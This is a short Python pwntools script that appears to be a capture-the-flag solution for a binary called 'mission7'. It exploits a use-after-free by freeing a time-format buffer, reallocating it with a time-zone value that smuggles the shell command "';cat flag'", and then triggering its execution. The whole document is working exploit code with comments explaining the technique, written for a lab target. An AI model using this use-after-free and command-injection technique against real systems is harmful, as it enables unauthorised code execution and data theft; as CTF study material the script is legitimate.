from pwn import *

p = process("./mission7")

# Set time format
print(p.recvuntil("Exit"))
p.sendline("1")
print(p.recvuntil(":"))
p.sendline("Test")

# Free it
print(p.recvuntil("Exit"))
p.sendline("1")
print(p.recvuntil(":"))
p.sendline(";")

# Set time zone which will allocate on the same space of the time format (USE AFTER FREE YAY)
print(p.recvuntil("Exit"))
p.sendline("3")
print(p.recvuntil(":"))
p.sendline("';cat flag'")

# Set the time 
print(p.recvuntil("Exit"))
p.sendline("2")
print(p.recvuntil(":"))
p.sendline("1")

# print the flag
print(p.recvuntil("Exit"))
p.sendline("4")

p.interactive()
